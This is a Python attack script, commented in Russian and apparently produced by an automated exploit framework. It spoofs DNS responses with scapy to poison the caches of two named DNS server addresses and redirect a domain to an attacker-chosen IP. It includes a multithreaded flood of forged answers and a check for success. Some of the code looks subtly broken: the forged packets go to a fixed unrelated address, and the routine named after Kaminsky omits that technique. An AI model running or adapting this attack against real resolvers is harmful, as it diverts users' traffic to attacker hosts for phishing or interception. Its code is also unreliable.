#!/usr/bin/env python3
"""
DNS Cache Poisoning Exploit
Вектор атаки: DNS Cache Poisoning
Цель: DNS серверы (78.37.77.77, 212.48.197.77)
Вероятность успеха: СРЕДНЯЯ
Уровень сложности: СРЕДНИЙ

Описание:
Kaminsky cache poisoning attack для отравления DNS кэша и перенаправления трафика.
Предсказание transaction ID и инъекция вредоносных DNS ответов.

Использование:
python3 dns_cache_poisoning.py --target 78.37.77.77 --domain example.com --malicious 6.6.6.6

Зависимости:
pip install scapy

Автор: Auto-exploit framework
Дата: 2026-07-30
"""

from scapy.all import *
import random
import threading
import time
import argparse

class DNSCachePoisoning:
    def __init__(self, target_dns, target_domain, malicious_ip):
        self.target_dns = target_dns
        self.target_domain = target_domain
        self.malicious_ip = malicious_ip
        self.transaction_id = None
    
    def reconnaissance(self):
        """Разведка DNS сервера"""
        print("[*] Разведка DNS сервера...")
        
        # Отправка запроса для анализа
        dns_packet = IP(dst=self.target_dns) / UDP(dport=53) / \
                     DNS(rd=1, qd=DNSQR(qname=self.target_domain))
        
        response = sr1(dns_packet, verbose=0)
        
        if response and response.haslayer(DNS):
            self.transaction_id = response[DNS].id
            print(f"[+] Transaction ID: {self.transaction_id}")
            print(f"[+] Source port: {response[UDP].sport}")
            
            return True
        else:
            print("[-] Нет ответа от DNS")
            return False
    
    def kaminsky_attack(self, duration=60):
        """Kaminsky cache poisoning attack"""
        print("[*] Запуск Kaminsky attack...")
        
        start_time = time.time()
        poisoned = False
        
        while time.time() - start_time < duration and not poisoned:
            # Генерация случайного transaction ID
            txid = random.randint(0, 65535)
            
            # Создание poison response
            poison_packet = IP(src=self.target_dns, dst='100.76.165.91') / \
                           UDP(sport=53, dport=random.randint(1024, 65535)) / \
                           DNS(id=txid, qr=1, aa=1, rcode=0, 
                               qd=DNSQR(qname=self.target_domain),
                               an=DNSRR(rrname=self.target_domain, 
                                      type='A', 
                                      rclass='IN',
                                      ttl=3600,
                                      rdata=self.malicious_ip))
            
            send(poison_packet, verbose=0)
            
            # Отправка запроса для проверки
            query_packet = IP(dst=self.target_dns) / UDP(dport=53) / \
                          DNS(rd=1, qd=DNSQR(qname=self.target_domain))
            
            response = sr1(query_packet, verbose=0, timeout=1)
            
            if response and response.haslayer(DNSRR):
                if response[DNSRR].rdata == self.malicious_ip:
                    print(f"[+] Cache poisoned! {self.target_domain} -> {self.malicious_ip}")
                    poisoned = True
                    break
            
            if random.randint(0, 100) < 5:
                print(f"[*] Attacking... TXID: {txid}")
        
        return poisoned
    
    def birthday_attack(self):
        """Birthday attack для совпадения TXID и port"""
        print("[*] Запуск birthday attack...")
        
        # Многопоточная атака для увеличения вероятности
        threads = []
        
        for i in range(100):
            t = threading.Thread(target=self._birthday_worker)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
    
    def _birthday_worker(self):
        """Worker для birthday attack"""
        for _ in range(1000):
            txid = random.randint(0, 65535)
            port = random.randint(1024, 65535)
            
            poison_packet = IP(src=self.target_dns, dst='100.76.165.91') / \
                           UDP(sport=53, dport=port) / \
                           DNS(id=txid, qr=1, aa=1, rcode=0,
                               qd=DNSQR(qname=self.target_domain),
                               an=DNSRR(rrname=self.target_domain,
                                      type='A',
                                      rclass='IN',
                                      ttl=3600,
                                      rdata=self.malicious_ip))
            
            send(poison_packet, verbose=0)
    
    def verify_poisoning(self):
        """Верификация poisoning"""
        print("[*] Верификация poisoning...")
        
        check = sr1(IP(dst=self.target_dns) / UDP(dport=53) / 
                   DNS(rd=1, qd=DNSQR(qname=self.target_domain)),
                  verbose=0, timeout=2)
        
        if check and check.haslayer(DNSRR):
            resolved_ip = check[DNSRR].rdata
            print(f"[+] {self.target_domain} resolves to {resolved_ip}")
            
            if resolved_ip == self.malicious_ip:
                print("[+] Poisoning подтвержден!")
                return True
            else:
                print("[-] Poisoning не удался")
                return False
        else:
            print("[-] Нет ответа от DNS")
            return False

def main():
    parser = argparse.ArgumentParser(description='DNS Cache Poisoning Exploit')
    parser.add_argument('--target', required=True, help='Target DNS server')
    parser.add_argument('--domain', required=True, help='Target domain')
    parser.add_argument('--malicious', required=True, help='Malicious IP address')
    parser.add_argument('--duration', type=int, default=120, help='Attack duration (seconds)')
    
    args = parser.parse_args()
    
    print(f"[*] DNS Cache Poisoning Exploit")
    print(f"[*] Target DNS: {args.target}")
    print(f"[*] Domain: {args.domain}")
    print(f"[*] Malicious IP: {args.malicious}")
    
    attack = DNSCachePoisoning(args.target, args.domain, args.malicious)
    
    attack.reconnaissance()
    
    if attack.kaminsky_attack(args.duration):
        attack.verify_poisoning()
    else:
        print("[-] Атака не удалась")

if __name__ == "__main__":
    main()
